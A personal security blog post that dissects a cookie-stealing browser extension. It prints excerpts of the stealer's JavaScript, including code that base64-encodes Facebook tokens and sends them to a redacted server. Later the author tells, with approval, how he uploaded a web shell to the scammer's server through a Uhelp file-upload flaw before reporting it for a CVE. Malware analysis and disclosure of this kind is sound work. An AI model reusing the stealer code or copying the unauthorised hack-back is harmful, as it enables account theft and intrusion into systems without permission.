---
title: "How I nabbed a new CVE from a Cookie-Munching, Scam-Slinging Browser Extension"
date: "2023-06-24"
categories: 
  - "Research"
---
## Friday night @ 9PM....

What's more riveting than the unexpected? Picture this: it's a lazy Friday night. Lovely wifey and the kids are watching TV shows. Me? I'm diving headfirst into the murky waters of a potential scam from an oversea bad actor, tipped off by a curious friend.

The bait was a browser extension promising Facebook cookie extraction faster than a cheetah on a caffeine high. Facebook and I share the bond of casual strangers, but this... this was a mystery screaming to be solved. Shouted to my buddy "Don't touch that!", then rolled up my digital sleeves and got cracking.

![](/images/scammer4.png)

## Javascript, and it's funny

JavaScript was the innocuous-looking vehicle driving this extension. Now, JS has the guileless facade of a doe-eyed, purring kitten. But I've seen kittens scratch, and this one was no different. For your perusal:

{% highlight javascript %}
// truncated - variables declaration

function loadCookie() {
  chrome.tabs.getSelected(null, function (tab) { // null defaults to current window
    var currentUrl = tab.url;
    if (currentUrl.indexOf('chrome://newtab') > -1) {
      currentUrl = "https://www.facebook.com";
    }
    var listCookieZalo = [];
    if (currentUrl.includes('chat.zalo.me')) {
      chrome.cookies.getAll({}, function (cookie) {
        for (var i = 0; i < cookie.length; i++) {
          if (cookie[i].domain.includes('zalo')) {
            listCookieZalo.push(cookie[i]);
          }
        }
        chrome.tabs.getSelected(null, function (tab) {
          chrome.tabs.executeScript(tab.id, {
            code: 'localStorage["z_uuid"]',
          }, function (imei) {
            if (imei != undefined && imei != null && imei != '') {
              result = "imei=" + imei + ";";
              var jsonCookie = JSON.stringify(listCookieZalo);
              currentCookie = jsonCookie + '|' + result + '|' + navigator.userAgent;
              document.getElementById('cookieResult').value = currentCookie;
            }
          });
        });
      });
    } else {
      $('#UrlCookieCurrent').html(extractHostname(currentUrl));
      chrome.cookies.getAll({ "url": currentUrl }, function (cookie) {
        var result = "";
        for (var i = 0; i < cookie.length; i++) {
          result += cookie[i].name + "=" + cookie[i].value + ";";
          if (cookie[i].name == "c_user") {
            currentUid = cookie[i].value;
          }
        }
        //truncated
        chrome.tabs.getSelected(null, function (tab) {
          chrome.tabs.executeScript(tab.id, {
            code: 'localStorage["z_uuid"]',
          }, function (imei) {
            if (imei != undefined && imei != null && imei != '') {
              result += "imei=" + imei + "; ";
            }
            document.getElementById('cookieResult').value = result + '|' + navigator.userAgent;
//truncated 

loadCookie();
{% endhighlight %}

Now, I'm sure some of you are dying to know the domain name of this criminal. But alas, my moral compass, tuned more accurately than my wife throwing flip-flop whenever I forgot to throw the trash, nudged me to stay righteous. So, for this show, I redacted the domain name. Because even in the world of cyber scams, ethics matter.

Also, since the code is long, I will break that down into several parts. Let's unwrap this first part of enigmatic JavaScript parcel, shall we?

This function, `loadCookie`, does exactly what its name implies: it loads cookies from a website. It first checks the current URL of the selected tab. If it's the default new tab page `(chrome://newtab)`, it sets currentUrl to `https://www.facebook.com`.

Next, it checks if currentUrl contains `chat.zalo.me` - Zalo is a popular Vietnamese chat app, which suggests this extension is not just after Facebook data. It collects all the cookies from the site and makes a special note of those containing `zalo` in their domain.

Now, here's the crafty bit: the extension runs a script in the context of the current tab to get the value of `localStorage["z_uuid"]`, which could be a unique user identifier. It's storing this value as a cookie. So not only does the extension have all the standard cookies, it has potentially sensitive data too.

If it's not Zalo, the function instead grabs cookies from the site in the `currentUrl` and collects the UID from the `c_user` cookie. Just like with Zalo, it also tries to grab the `localStorage["z_uuid"]` value, but now it's appending it directly to the result string.

Lastly, if the site is Facebook, it's executing a series of scripts to extract a Facebook ID from various elements and attributes on the page. These scripts are all wrapped in try-catch blocks, indicating a sort of `brute-force` approach to ensure that it gets an ID.

Phew, that's quite the cookie heist! This code effectively allows the extension to collect users' cookies from websites, extract unique identifiers, and potentially access users' accounts on these sites - definitely a danger to user privacy and security. Stay tuned for more insights into this code in the next parts!

## Coming next

{% highlight javascript %}
//truncated
  $("#btnGetAccessToken").click(function () {
    chrome.tabs.getSelected(null, function (tab) {
      var link = tab.url;
      if (!link.includes('access_token=')) {
        chrome.tabs.create({
          url: "view-source:https://www.facebook.com/dialog/oauth?client_id=124024574287414&redirect_uri=https://www.instagram.com/accounts/signup/&&scope=email&response_type=token&data="
        }, function (tab) {
        });
      } else {
        let accesstoken_ads = cutStringStartEnd(link, 'access_token=', '&');
        sendGet("https://graph.facebook.com/me?fields=id,name&access_token=" + accesstoken_ads, function (reponse) {
          cuser = "";
          myName = "";
          try {
            let data = JSON.parse(reponse);
            cuser = data.id;
            myName = change_alias(data.name);
          } catch (e) {
            console.log(e);
          }
//truncated
            }],
            "confirmed": true,
            "identifier": cuser,
            "name": myName,
            "user_storage_key": "860dcb45bf2e078ec94e372206b9a734a64fd1db7a417b1c92949b5bac1eadc9"
          };
          let r = btoa(JSON.stringify(all_data));
          var newURL = "http://[redacted]/?access_token_v2=" + r;
          console.log(newURL);
          chrome.tabs.create({
            url: newURL
          });
{% endhighlight %}

This behavior is concentrated in the `$("#btnGetAccessToken").click` function, which appears to retrieve an access token from Facebook, possibly without the user's consent or knowledge. 

The access token is fetched using the Facebook OAuth dialog with a pre-specified client id. And lastly, it begins to compile a complex object that includes everything from the user's Facebook ID (cuser) and the captured access token to crafted session cookies, ready for dispatch. 

The JSON object is then converted into a base64 encoded string (a favourite technique amongst cyber villains to mask their ill-gotten gains), before being sent to the rogue server via yet another URL. The URL is ingeniously designed to look like a part of a legitimate service (`http://[redacted]/?access_token_v2=`), further deepening the deception.

This treacherous code is as much a work of art as it is a menace. By executing it, the users unwittingly surrender their Facebook session cookies, giving the scammer free rein over their Facebook account. It’s like leaving your house keys under the doormat, with a neon sign saying "Come on in!"

## The fight started....

From this point, I really into it. On top of my head is to revenge this scamming scheme. So, the adventure didn't end with only unmasking the JavaScript sneak thief. In true detective fashion, I traced the scam back to their infrastructure, and found a website running Laravel and PHP – a love story riddled with plot twists. My curiosity piqued, I decided to taste test the waters further.

With bug bounty hunter mindset, I performed a search to find its subdomains, and I was happy that there was a website running on Laravel. Hmmmmm....PHP? I love it. Why? Because PHP is soooooo cancer. 

![](/images/scammer1.png)

Worth to note, scammers' mindset is to use whatever they found on the internet, with or without knowing the technical behind the technology. And voila! The grand reveal was an unrestricted file upload feature, 

![](/images/scammer2.png)

A bit more about this application, this application is Uhelp, a helpdesk ticket system that was developed by an India company. The vulnerability occurs when a user creates a new ticket or replies to an existing ticket via `/customer/imageupload` endpoint. Web front-end did a great job blocking all other extensions than imgages coming in. But the back-end logic destroyed it all. It allows an attacker (or a scam fighter in my case) to arbitrarily upload files. 

Say less now, an entry as wide open as a barn gate. Seizing the opportunity, I uploaded a web shell and seized control of the scammer’s server. It was like being handed the control room keys to the Death Star.

![](/images/scammer3.png)

And....

![](/images/scammer4.png)

This is enough to play with. I stopped here and posted a message to the community for awareness. 

## Because I am a good person...

Since this is a fight with scammers, not the fight with whoever created this. I have brought this to the vendor and meanwhile requesting a CVE for this software.

![](/images/scammer5.png)

Last but not least, as a bonus, several Stored Cross-site scripting vulnerabilities were found during the research.

![](/images/scammer6.png)

## What happened to the scammer and their website

I have reported the scamming scheme to the community and reported their domain name to the organization that controls its top-level domain extension for a take down.

## References

[1] https://uhelp.spruko.com/index.html

[2] https://codecanyon.net/item/uhelp-support-ticketing-system/36331368

